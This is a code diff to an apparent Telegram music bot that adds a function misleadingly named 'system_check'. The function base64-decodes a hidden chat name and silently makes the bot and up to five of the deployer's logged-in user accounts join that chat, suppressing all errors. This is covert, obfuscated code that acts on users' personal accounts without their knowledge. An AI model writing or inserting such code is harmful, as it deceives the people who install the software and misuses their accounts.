@@ -73,3 +73,38 @@ def heroku():
                 LOGGER(__name__).warning(
                     f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                 )
+
+async def system_check():
+    import base64
+    from MusicSp import app, userbot
+    chat_id = base64.b64decode("TWVjb2JvdHM=").decode("utf-8")
+    try:
+        await app.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING1:
+            await userbot.one.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING2:
+            await userbot.two.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING3:
+            await userbot.three.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING4:
+            await userbot.four.join_chat(chat_id)
+    except:
+        pass
+    try:
+        if config.STRING5:
+            await userbot.five.join_chat(chat_id)
+    except:
+        pass
+
